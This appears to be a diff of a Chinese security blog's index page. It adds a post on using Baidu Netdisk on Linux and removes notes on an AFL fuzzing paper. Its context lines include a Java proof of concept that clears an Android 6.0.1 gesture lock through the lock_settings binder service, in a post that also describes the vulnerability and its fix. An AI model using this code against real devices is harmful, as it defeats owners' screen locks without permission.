@@ -122,7 +122,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-count">99</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -177,6 +177,89 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/BaiduNetdisk/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="henices">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 安全代码">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/cn/BaiduNetdisk/" class="post-title-link" itemprop="url">Linux 下使用百度网盘</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>百度网盘在国内很大概率是绕不过去，稍大点文件都喜欢用百度网盘给下载地址。可是百度网盘下载<br>是限速的，而且对 Linux 用户非常不友好，我的 Fedora 装上 rpm 包也用不了，直接崩溃，所以得想点其他办法。</p>
+<h3 id="1-官方安装包-（不一定都能使用）"><a href="#1-官方安装包-（不一定都能使用）" class="headerlink" title="1. 官方安装包 （不一定都能使用）"></a>1. 官方安装包 （不一定都能使用）</h3><p>官方提供了 deb 和 rpm 格式安装包</p>
+<p><a target="_blank" rel="noopener" href="http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.rpm">http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.rpm</a><br><a target="_blank" rel="noopener" href="http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.deb">http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.deb</a></p>
+<p>但是在 Fedora 安装后，会报错误。</p>
+<h3 id="2-BaiduPCS-Go-（百度网盘客户端-Go语言编写）"><a href="#2-BaiduPCS-Go-（百度网盘客户端-Go语言编写）" class="headerlink" title="2. BaiduPCS-Go （百度网盘客户端 - Go语言编写）"></a>2. BaiduPCS-Go （百度网盘客户端 - Go语言编写）</h3><p><a target="_blank" rel="noopener" href="https://github.com/iikira/BaiduPCS-Go">https://github.com/iikira/BaiduPCS-Go</a></p>
+<h4 id="2-1-登录"><a href="#2-1-登录" class="headerlink" title="2.1 登录"></a>2.1 登录</h4><p>.&#x2F;BaiduPCS-Go login -bduss&#x3D;xxxxx</p>
+<h4 id="2-2-设置并发"><a href="#2-2-设置并发" class="headerlink" title="2.2 设置并发"></a>2.2 设置并发</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; config set -max_parallel=50</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-3-下载"><a href="#2-3-下载" class="headerlink" title="2.3 下载"></a>2.3 下载</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; download xxxxx</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-使用浏览器插件"><a href="#3-使用浏览器插件" class="headerlink" title="3. 使用浏览器插件"></a>3. 使用浏览器插件</h3><p><a target="_blank" rel="noopener" href="https://github.com/acgotaku/BaiduExporter.git">https://github.com/acgotaku/BaiduExporter.git</a></p>
+<p>可以直接使用作者提供的打包好的插件, 直接安装即可。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx">https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx</a></p>
+<p>这个插件将使用 aria2c 下载，使用得先准备一个可以使用的aria2c<br>要让 aria2c 更好用一些，可以修改一下配置，配置文件可以参考</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf">https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1002,7 +1085,7 @@
 
 <h3 id="2）-Android-6-0-1-MOB3OM-手势密码清除漏洞"><a href="#2）-Android-6-0-1-MOB3OM-手势密码清除漏洞" class="headerlink" title="2） Android 6.0.1 MOB3OM 手势密码清除漏洞"></a>2） Android 6.0.1 MOB3OM 手势密码清除漏洞</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> getIBinder(<span class="string">&quot;lock_settings&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">Parcel</span> <span class="variable">data1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">	<span class="type">Parcel</span> <span class="variable">reply1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());</span><br><span class="line">		data1.writeByteArray(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">255</span>]);</span><br><span class="line">		serviceBinder.transact(<span class="number">7</span>, data1, reply1, <span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (RemoteException e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> IBinder <span class="title function_">getIBinder</span><span class="params">(String service)</span> &#123;</span><br><span class="line">	<span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">				.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, service);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>在Android 6.0.1 MOB3OM 之前的一些版本中, 未在setLockPattern 中做权限检查,<br>导致apk 不需要任何权限就可以将手势密码清除. </p>
-<p>这个问题已经修复 author Jim Miller <a href="mailto:&#x6a;&#97;&#103;&#103;&#105;&#101;&#115;&#64;&#103;&#111;&#x6f;&#103;&#108;&#x65;&#x2e;&#x63;&#x6f;&#109;">&#x6a;&#97;&#103;&#103;&#105;&#101;&#115;&#64;&#103;&#111;&#x6f;&#103;&#108;&#x65;&#x2e;&#x63;&#x6f;&#109;</a>	Wed Apr 13 16:35:36 2016 -0700</p>
+<p>这个问题已经修复 author Jim Miller <a href="mailto:&#x6a;&#97;&#103;&#x67;&#105;&#101;&#115;&#x40;&#x67;&#111;&#111;&#x67;&#108;&#x65;&#x2e;&#99;&#111;&#109;">&#x6a;&#97;&#103;&#x67;&#105;&#101;&#115;&#x40;&#x67;&#111;&#111;&#x67;&#108;&#x65;&#x2e;&#99;&#111;&#109;</a>	Wed Apr 13 16:35:36 2016 -0700</p>
 <p><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0">https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0</a></p>
 <p>但是考虑到Android 的碎片化问题, 估计在一些手机中将存在这个问题. </p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
@@ -1080,113 +1163,6 @@
     <div class="post-body" itemprop="articleBody">
           <p>afl-fuzz 的整体架构，新手理解起来还是比较费劲，网络上发现一张图觉得不错，放上来大家看看，感谢原作者。</p>
 <p><img src="https://raw.githubusercontent.com/henices/pictures/master/afl-fuzz.png" alt="afl-fuzz"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/afl-fuzz1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/afl-fuzz1/" class="post-title-link" itemprop="url">Dissecting American Fuzzy Lop A FuzzBench Evaluation 要点</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>paper: <a target="_blank" rel="noopener" href="https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf">https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf</a></p>
-<h2 id="两个实验的结论-主要基于-FuzzBench"><a href="#两个实验的结论-主要基于-FuzzBench" class="headerlink" title="两个实验的结论 (主要基于 FuzzBench)"></a>两个实验的结论 (主要基于 FuzzBench)</h2><ul>
-<li>Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance of each variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggests that users should include a variant without hitcounts when doing parallel or ensemble fuzzing like OSS-Fuzz.</li>
-<li>The conclusion we can draw from this experiment is that it would be a mistake to underestimate the impact of the novelty search. In particular, researchers proposing new approaches that also modify this aspect should care-fully evaluate – in isolation – the benefit of a different mechanism to decide if an input is interesting, as AFL’s novelty search provides a strong baseline.</li>
-</ul>
-<h2 id="论文中计划要评估的-afl-fuzz-的一些技术"><a href="#论文中计划要评估的-afl-fuzz-的一些技术" class="headerlink" title="论文中计划要评估的 afl-fuzz 的一些技术"></a>论文中计划要评估的 afl-fuzz 的一些技术</h2><ul>
-<li><strong>Hitcounts</strong>: Hitcounts are adopted by other fuzzers to-day, but AFL was the first to introduce this concept.Despite its wide adoption, the impact of this optimization (overplain edge coverage) has never been measured in isolation on a large set of targets.</li>
-<li><strong>Novelty search vs. maximization of a fitness</strong>: While AFL considers every new discovered hitcount as interesting, both other early fuzzing solutions and more recent tools instead only consider testcases that maximize a given metricas interesting. For instance, VUZZER uses the sum of all the weights of the executed basic blocks.<ul>
-<li>In this experiment, we benchmark the AFL approach versusa fitness maximization and the combination of the two ap-proaches, as proposed by VUZZER</li>
-<li>We expect the novelty search to outperforms both of the competing algorithms,</li>
-</ul>
-</li>
-<li><strong>Corpus culling</strong>: The prioritization of the small and fast testcases in the AFL corpus selection algorithm trades speed with the fuzzing of more complex testcases that often corresponds to complex program states<ul>
-<li>In this experiment, we want to assess the difference in using the AFL corpus culling mechanism versus using the entire corpus.</li>
-<li>We expect faster growth in coverage over time and,potentially, more bugs triggered in the same time window</li>
-</ul>
-</li>
-<li><strong>Score calculation</strong>: The performance score used to cal-culate how many times to mutate and execute the input in the havoc, and splice stages are derived from many variables,mainly testcase size and execution time<ul>
-<li>In this experiment, we want to measure the delta between the AFL solution and the baseline, represented by a constantand a random score</li>
-</ul>
-</li>
-<li><strong>Corpus scheduling</strong>: The FIFO policy used by AFL is only one of the possible policies that a fuzzer can adopt to select the next testcase<ul>
-<li>Thus, we evaluate AFL versus a modified version that implements the baseline, random selection, and the opposite approach, a LIFO scheduler.</li>
-</ul>
-</li>
-<li><strong>Splicing as stage vs. splicing as mutation</strong>: Splicing refers to the operation that merges two different testcases into a new one<ul>
-<li>We modified the AFL codebase to implement splicing as a mutation operator to compare the two.</li>
-</ul>
-</li>
-<li><strong>Trimming</strong>: Trimming the testcases allows the fuzzer to reduce the size of the input files and consequently give priority to small inputs, under the assumptions that large inputs introduce a slowdown in the execution and the mutations would be less likely to modify an important portion of the binary structure<ul>
-<li>Despite the fact that this algorithm can bring the two important benefits described above, we argue that reducing the size of the testcases could lead to lose state coverage.Additionally, the trimming phase could become a bottleneck for slow targets</li>
-<li>Therefore, in our evaluation we plan tocompare the default version of AFL against a modified one,where we disabled trimming</li>
-</ul>
-</li>
-<li><strong>Collisions</strong>: As explained in section III-F the AFL ap-proach to instrument the source code of the target programs consists of assigning an identifier for each basic block at compile-time.<ul>
-<li>We want to benchmark this feature as the collision-free variant is simpler than the original implementation with pc-guard, raising the question why random identifiers are used in AFL</li>
-</ul>
-</li>
-</ul>
 
       
     </div>
